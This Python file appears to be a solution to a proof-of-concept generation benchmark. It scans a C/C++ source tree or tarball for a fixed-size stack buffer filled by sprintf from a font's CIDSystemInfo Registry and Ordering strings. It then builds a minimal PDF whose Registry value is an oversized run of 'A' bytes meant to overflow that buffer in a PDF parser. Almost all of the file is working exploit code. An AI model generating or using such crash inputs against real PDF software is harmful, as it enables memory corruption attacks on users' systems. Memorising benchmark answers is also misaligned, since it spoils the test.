import os
import re
import tarfile
from typing import Optional, Dict, Iterable, Tuple


def _iter_source_texts_from_tar(tar_path: str) -> Iterable[Tuple[str, str]]:
    try:
        with tarfile.open(tar_path, mode="r:*") as tf:
            for m in tf:
                if not m.isfile():
                    continue
                name = m.name
                low = name.lower()
                if not (low.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".m", ".mm", ".inc"))):
                    continue
                if m.size <= 0 or m.size > 8 * 1024 * 1024:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                finally:
                    try:
                        f.close()
                    except Exception:
                        pass
                if not data:
                    continue
                text = data.decode("utf-8", errors="ignore")
                if not text:
                    continue
                yield name, text
    except Exception:
        return


def _iter_source_texts_from_dir(root: str) -> Iterable[Tuple[str, str]]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".m", ".mm", ".inc")
    for base, _, files in os.walk(root):
        for fn in files:
            low = fn.lower()
            if not low.endswith(exts):
                continue
            path = os.path.join(base, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > 8 * 1024 * 1024:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            text = data.decode("utf-8", errors="ignore")
            if not text:
                continue
            yield path, text


def _extract_int_defines(text: str) -> Dict[str, int]:
    defs: Dict[str, int] = {}
    for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\b", text):
        try:
            defs[m.group(1)] = int(m.group(2))
        except Exception:
            pass
    for m in re.finditer(r"(?m)^\s*(?:static\s+)?const\s+int\s+([A-Za-z_]\w*)\s*=\s*(\d+)\s*;", text):
        try:
            defs[m.group(1)] = int(m.group(2))
        except Exception:
            pass
    for m in re.finditer(r"(?m)^\s*(?:static\s+)?const\s+size_t\s+([A-Za-z_]\w*)\s*=\s*(\d+)\s*;", text):
        try:
            defs[m.group(1)] = int(m.group(2))
        except Exception:
            pass
    return defs


def _find_vuln_buffer_size(src_path: str) -> Optional[int]:
    if not src_path:
        return None

    if os.path.isdir(src_path):
        it = _iter_source_texts_from_dir(src_path)
    else:
        it = _iter_source_texts_from_tar(src_path)

    decl_re = re.compile(r"\bchar\s+([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]")
    sprintf_re = re.compile(
        r"\bsprintf\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"[^\"]*%s\s*-\s*%s[^\"]*\"\s*,\s*([^\)]*)\)",
        re.DOTALL,
    )
    snprintf_re = re.compile(
        r"\bsnprintf\s*\(\s*([A-Za-z_]\w*)\s*,\s*([A-Za-z_]\w*|\d+)\s*,\s*\"[^\"]*%s\s*-\s*%s[^\"]*\"\s*,\s*([^\)]*)\)",
        re.DOTALL,
    )
    strcat_pattern_present_re = re.compile(r"\bstrcat\s*\(|\bstrcpy\s*\(", re.DOTALL)

    best: Optional[int] = None

    for _, text in it:
        if "Registry" not in text or "Ordering" not in text:
            continue
        if "CIDSystemInfo" not in text and "%s-%s" not in text and "%s - %s" not in text:
            continue

        defs = _extract_int_defines(text)

        for m in re.finditer(r"%s\s*-\s*%s", text):
            pos = m.start()
            window = text[max(0, pos - 3000) : min(len(text), pos + 3000)]
            if "Registry" not in window or "Ordering" not in window:
                continue

            decls: Dict[str, int] = {}
            for dm in decl_re.finditer(window):
                var = dm.group(1)
                sz_tok = dm.group(2)
                sz: Optional[int] = None
                if sz_tok.isdigit():
                    try:
                        sz = int(sz_tok)
                    except Exception:
                        sz = None
                else:
                    sz = defs.get(sz_tok)
                if sz is not None and 1 <= sz <= 2_000_000:
                    decls[var] = sz

            for sm in sprintf_re.finditer(window):
                buf = sm.group(1)
                args = sm.group(2)
                if ("Registry" in args) and ("Ordering" in args):
                    sz = decls.get(buf)
                    if sz is not None:
                        if best is None or sz > best:
                            best = sz

            for snm in snprintf_re.finditer(window):
                buf = snm.group(1)
                size_tok = snm.group(2)
                args = snm.group(3)
                if ("Registry" in args) and ("Ordering" in args):
                    if size_tok.isdigit():
                        try:
                            sz = int(size_tok)
                        except Exception:
                            sz = None
                    else:
                        sz = defs.get(size_tok)
                    if sz is not None and 1 <= sz <= 2_000_000:
                        if best is None or sz > best:
                            best = sz

        if best is None:
            if "CIDSystemInfo" in text and strcat_pattern_present_re.search(text):
                for dm in decl_re.finditer(text):
                    var = dm.group(1)
                    sz_tok = dm.group(2)
                    sz: Optional[int] = None
                    if sz_tok.isdigit():
                        try:
                            sz = int(sz_tok)
                        except Exception:
                            sz = None
                    else:
                        sz = defs.get(sz_tok)
                    if sz is not None and 1 <= sz <= 2_000_000:
                        if best is None or sz > best:
                            best = sz

    return best


def _build_pdf(registry: bytes, ordering: bytes) -> bytes:
    def pdf_str(b: bytes) -> bytes:
        return b"(" + b + b")"

    reg_s = pdf_str(registry)
    ord_s = pdf_str(ordering)

    header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

    stream_data = b"BT /F1 12 Tf 72 720 Td (A) Tj ET\n"
    obj5 = b"<< /Length " + str(len(stream_data)).encode("ascii") + b" >>\nstream\n" + stream_data + b"endstream\n"

    # Keep names short to reduce overhead
    obj1 = b"<< /Type /Catalog /Pages 2 0 R >>\n"
    obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
    obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\n"
    obj4 = b"<< /Type /Font /Subtype /Type0 /BaseFont /B /Encoding /Identity-H /DescendantFonts [6 0 R] >>\n"
    obj6 = (
        b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /B "
        b"/CIDSystemInfo << /Registry " + reg_s + b" /Ordering " + ord_s + b" /Supplement 0 >> "
        b"/FontDescriptor 7 0 R /CIDToGIDMap /Identity /DW 1000 >>\n"
    )
    obj7 = (
        b"<< /Type /FontDescriptor /FontName /B /Flags 4 "
        b"/FontBBox [0 -200 1000 1000] /ItalicAngle 0 "
        b"/Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>\n"
    )

    objects = [obj1, obj2, obj3, obj4, obj5, obj6, obj7]

    buf = bytearray()
    buf.extend(header)

    offsets = [0]
    for i, obj in enumerate(objects, start=1):
        offsets.append(len(buf))
        buf.extend(str(i).encode("ascii"))
        buf.extend(b" 0 obj\n")
        buf.extend(obj)
        if not obj.endswith(b"\n"):
            buf.extend(b"\n")
        buf.extend(b"endobj\n")

    startxref = len(buf)
    buf.extend(b"xref\n0 ")
    buf.extend(str(len(offsets)).encode("ascii"))
    buf.extend(b"\n")
    buf.extend(b"0000000000 65535 f \n")
    for off in offsets[1:]:
        buf.extend(f"{off:010d} 00000 n \n".encode("ascii"))
    buf.extend(b"trailer\n<< /Size ")
    buf.extend(str(len(offsets)).encode("ascii"))
    buf.extend(b" /Root 1 0 R >>\nstartxref\n")
    buf.extend(str(startxref).encode("ascii"))
    buf.extend(b"\n%%EOF\n")
    return bytes(buf)


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_size = _find_vuln_buffer_size(src_path)

        # Default based on ground-truth PoC length hints
        if buf_size is None or buf_size < 16 or buf_size > 2_000_000:
            buf_size = 80000

        # Ensure overflow margin; keep ordering minimal
        # Make registry long enough to exceed stack buffer used for "<Registry>-<Ordering>"
        registry_len = int(buf_size) + 64
        ordering_len = 1

        registry = b"A" * registry_len
        ordering = b"B" * ordering_len

        return _build_pdf(registry, ordering)